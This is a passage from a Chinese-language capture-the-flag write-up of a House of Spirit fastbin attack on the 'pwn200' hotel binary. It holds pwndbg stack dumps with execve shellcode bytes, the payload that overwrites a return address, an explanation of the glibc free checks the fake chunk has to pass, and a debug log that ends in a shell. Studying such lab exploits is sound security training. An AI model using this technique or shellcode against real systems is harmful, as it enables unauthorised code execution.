    			#d840是main函数的返回地址
0x7fffffffddb8: 0x00007fffffffde88  0x00000001f7ffcca0
0x7fffffffddc8: 0x0000000000400b36  0x0000000000000000
0x7fffffffddd8: 0x35e7fe72fd004534  0x00000000004006b0
0x7fffffffdde8: 0x00007fffffffde80  0x0000000000000000
0x7fffffffddf8: 0x0000000000000000  0xca18010d50a04534
0x7fffffffde08: 0xca1811b744304534  0x0000000000000000
0x7fffffffde18: 0x0000000000000000  0x0000000000000000
Pwndbg> 
```

#### 执行登录操作
```c
checkin(0x30,p64(0)*3+p64(reg_RBP - 0xc0 + 1))
```

Checkin中的malloc，由于fastbin=0x7fffffffdd00，因此malloc后ptr=0x7fffffffdd10

执行malloc之后：

```c
#释放fastbin中刚才回收的chunk，结果如下：
#&rbp-90==0x7fffffffdd10
pwndbg>  x/50gx 0x7fffffffdc98
0x7fffffffdc98: 0x0000000000400824  0x000000000000000e
0x7fffffffdca8: 0x0000000000000000  0x00007fffffffdcd0
0x7fffffffdcb8: 0x00000000004009e0  0x0000000000000000
0x7fffffffdcc8: 0x00007ffff7ffe168  0x00007fffffffdd20
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#payload更改的内容：
0x7fffffffdcd8: 0x0000000000400a8c  0x69622fbb48f63100 #shellcode_start
    								#buf从这里开始
0x7fffffffdce8: 0x54535668732f2f6e	0x050fd231583b6a5f #shellcode_end
0x7fffffffdcf8: 0x0000000000000000  0x0000000000000000
0x7fffffffdd08: 0x0000000000000041  0x0000000000000000
    								#输入的id内容
									#此内容所在的地址为：0x7fffffffdd10
0x7fffffffdd18: 0x00007fffffffdd10  0x00007fffffffdd80
    			#ptr现在被修改为指向0x7fffffffdd10
    			#malloc_chunk地址为：0x7fffffffdd00
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''    
0x7fffffffdd28: 0x0000000000400b34  0x00007ffff7dd18e0
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#输入的id大小		 #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
0x7fffffffdd68: 0x6161616161616161  0x6161616161616161
0x7fffffffdd78: 0x6161616161616161  0x00007fffffffdda0 
    								#printf会泄露的内容：&rbp
0x7fffffffdd88: 0x0000000000400b59  0x00007fffffffde88
0x7fffffffdd98: 0x0000000100000000  0x0000000000400b60
    								#rbp，内容所在的地址为：0x7fffffffdda0
0x7fffffffdda8: 0x00007ffff7a2d840  0x0000000000000001
    			#d840是main函数的返回地址
0x7fffffffddb8: 0x00007fffffffde88  0x00000001f7ffcca0
0x7fffffffddc8: 0x0000000000400b36  0x0000000000000000
0x7fffffffddd8: 0x35e7fe72fd004534  0x00000000004006b0
0x7fffffffdde8: 0x00007fffffffde80  0x0000000000000000
0x7fffffffddf8: 0x0000000000000000  0xca18010d50a04534
0x7fffffffde08: 0xca1811b744304534  0x0000000000000000
0x7fffffffde18: 0x0000000000000000  0x0000000000000000
Pwndbg> 
```



```c
#写入payload所执行的内容p64(0)*3+p64(reg_RBP - 0xc0 + 1)，结果如下：
#&rbp-90==0x7fffffffdd10
#&rbp-0xc0+1==0x7fffffffdce1
pwndbg>  x/50gx 0x7fffffffdc98
0x7fffffffdc98: 0x0000000000400824  0x000000000000000e
0x7fffffffdca8: 0x0000000000000000  0x00007fffffffdcd0
0x7fffffffdcb8: 0x00000000004009e0  0x0000000000000000
0x7fffffffdcc8: 0x00007ffff7ffe168  0x00007fffffffdd20
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#payload更改的内容：
0x7fffffffdcd8: 0x0000000000400a8c  0x69622fbb48f63100 #shellcode_start
    								#buf从这里开始
0x7fffffffdce8: 0x54535668732f2f6e	0x050fd231583b6a5f #shellcode_end
0x7fffffffdcf8: 0x0000000000000000  0x0000000000000000 
0x7fffffffdd08: 0x0000000000000041  0x0000000000000000
    								#输入的id内容
									#此内容所在的地址为：0x7fffffffdd10
    			#ptr现在被修改为指向0x7fffffffdd10
    			#malloc_chunk地址为：0x7fffffffdd00
0x7fffffffdd18: 0x0000000000000000  0x0000000000000000
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''    
0x7fffffffdd28: 0x00007fffffffdce1  0x00007ffff7dd18e0
    			#现在已被覆盖为shellcode地址
#0x7fffffffdd28: 0x0000000000400b34  0x00007ffff7dd18e0（原内容）
#.text:0000000000400B2A                 mov     eax, 0
#.text:0000000000400B2F                 call    sub_400A29
#.text:0000000000400B34                 leave #被覆盖为shellcode
#.text:0000000000400B35                 retn
    
#修改的是这个函数的leave    
#int sub_400A8E()
#{
#  signed __int64 i; // [rsp+10h] [rbp-40h]
#  char v2[48]; // [rsp+20h] [rbp-30h]
#
#  puts("who are u?");
#  for ( i = 0LL; i <= 47; ++i )
#  {
#    read(0, &v2[i], 1uLL);
#    if ( v2[i] == 10 )
#   {
#     v2[i] = 0;
#     break;
#   }
# }
# printf("%s, welcome to ISCC~ \n", v2);
# puts("give me your id ~~?");
# sub_4007DF();
# sub_400A29();
#}
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#输入的id大小	     #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
0x7fffffffdd68: 0x6161616161616161  0x6161616161616161
0x7fffffffdd78: 0x6161616161616161  0x00007fffffffdda0 
    								#printf会泄露的内容：&rbp
0x7fffffffdd88: 0x0000000000400b59  0x00007fffffffde88
0x7fffffffdd98: 0x0000000100000000  0x0000000000400b60
    								#rbp，内容所在的地址为：0x7fffffffdda0
0x7fffffffdda8: 0x00007ffff7a2d840  0x0000000000000001
    			#d840是main函数的返回地址
0x7fffffffddb8: 0x00007fffffffde88  0x00000001f7ffcca0
0x7fffffffddc8: 0x0000000000400b36  0x0000000000000000
0x7fffffffddd8: 0x35e7fe72fd004534  0x00000000004006b0
0x7fffffffdde8: 0x00007fffffffde80  0x0000000000000000
0x7fffffffddf8: 0x0000000000000000  0xca18010d50a04534
0x7fffffffde08: 0xca1811b744304534  0x0000000000000000
0x7fffffffde18: 0x0000000000000000  0x0000000000000000
Pwndbg> 
```

程序退出时就可以执行shellcode从而getshell。

### 思考
好了，现在可以getshell了，但是我们要思考一个问题，这道题是如何使用house of spirit这种攻击方式的？

其实上面某些关键地址的内存并不准确（之前也提到过），比如下面这个地方：

```c
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#显示不准确的地方	   #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
```

其实payload执行时正确的内存为：

```c
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003 
    								#next_prev_size
0x7fffffffdd48: 0x000000000000001f  0x6161616161616161
    			#next_size字段       #next_malloc_data
    			#更改的地方	         #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
```

这个地方有什么用呢？

答：<font style="color:#333333;background-color:#F5F5F5;">是为了伪造</font>`next chunk size`<font style="color:#333333;background-color:#F5F5F5;">，目的是让后面的</font>`fake chunk`<font style="color:#333333;background-color:#F5F5F5;">能够顺利free掉。</font>

回顾一下house of spirit的核心思想：

> （[https://wiki.x10sec.org/pwn/heap/fastbin_attack/#house-of-spirit](https://wiki.x10sec.org/pwn/heap/fastbin_attack/#house-of-spirit)）
>

House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。

该技术的核心在于在目标位置处**<font style="color:#F5222D;">伪造 fastbin chunk</font>**，并将其释放，从而达到分配**指定地址**的 chunk 的目的。

要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即

+ fake chunk 的 ISMMAP 位不能为1，因为 <font style="color:#F5222D;">free</font> 时，如果是 mmap 的 chunk，会单独处理。
+ fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
+ fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
+ fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
+ fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

至于为什么要绕过这些检测，可以参考 free 部分的源码。

首先来看第一条：fake chunk 的 ISMMAP 位不能为1

由于我们伪造的fake chunk的size为0x41，将其写成二进制的形式为1000001，再根据下面这张图就知道绕过了检测一。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603775985689-f81bf21b-f178-47c1-bbc6-d2929891890e.png)

第二条：fake chunk 地址需要对齐， MALLOC_ALIGN_MASK。fake chunk的地址已经对齐，这里不再说。

第三条：已满足，不再说。

第四条：fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。

**<font style="color:#F5222D;">在32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8</font>**<font style="color:#F5222D;">。</font><font style="color:#000000;">next_chunk大小为</font><font style="color:#000000;">1f（</font>十进制：31），同时也小于system_mem。

第五条：fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。已满足。

### 思路总结
在这道题目中为什么要伪造fastbin_chunk?是因为所有的溢出均无法覆盖到有效的地址（return to shellcode），因此我们需要伪造一个fastibin_chunk回收到fastbin链中再释放从而控制更大范围的内存空间。在其中要注意伪造fake_fastbin_chunk的条件。

### Debug日志
```c
➜  House Of Spirit python exp.py 
[*] '/home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[!] Could not find executable 'pwn200' in $PATH, using './pwn200' instead
[+] Starting local process './pwn200' argv=['pwn200'] : pid 18155
[DEBUG] Received 0xb bytes:
    'who are u?\n'
[DEBUG] Sent 0x30 bytes:
    'a' * 0x30
[DEBUG] Received 0x5e bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  80 fc e4 ce  fe 7f 2c 20  77 65 6c 63  6f 6d 65 20  │····│··, │welc│ome │
    00000040  74 6f 20 49  53 43 43 7e  20 0a 67 69  76 65 20 6d  │to I│SCC~│ ·gi│ve m│
    00000050  65 20 79 6f  75 72 20 69  64 20 7e 7e  3f 0a        │e yo│ur i│d ~~│?·│
    0000005e
[+] RBP register ===> 0x7ffecee4fc80
[DEBUG] Sent 0x3 bytes:
    '31\n'
[DEBUG] Received 0xf bytes:
    'give me money~\n'
[DEBUG] Sent 0x40 bytes:
    00000000  00 31 f6 48  bb 2f 62 69  6e 2f 2f 73  68 56 53 54  │·1·H│·/bi│n//s│hVST│
    00000010  5f 6a 3b 58  31 d2 0f 05  00 00 00 00  00 00 00 00  │_j;X│1···│····│····│
    00000020  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  │····│····│A···│····│
    00000030  00 00 00 00  00 00 00 00  f0 fb e4 ce  fe 7f 00 00  │····│····│····│····│
    00000040
[DEBUG] Received 0x4d bytes:
    '\n'
    '=======EASY HOTEL========\n'
    '1. check in\n'
    '2. check out\n'
    '3. goodbye\n'
    'your choice : '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x52 bytes:
    'out~\n'
    '\n'
    '=======EASY HOTEL========\n'
    '1. check in\n'
    '2. check out\n'
    '3. goodbye\n'
    'your choice : '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xa bytes:
    'how long?\n'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x19 bytes:
    'give me more money : \n'
    '48\n'
[DEBUG] Sent 0x20 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  c1 fb e4 ce  fe 7f 00 00  │····│····│····│····│
    00000020
[DEBUG] Received 0x51 bytes:
    'in~\n'
    '\n'
    '=======EASY HOTEL========\n'
    '1. check in\n'
    '2. check out\n'
    '3. goodbye\n'
    'your choice : '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[*] Switching to interactive mode
[DEBUG] Received 0xa bytes:
    'good bye~\n'
good bye~
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x1b bytes:
    'exp.py\tpwn200\ttest  test.c\n'
exp.py    pwn200    test  test.c
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
$  
```



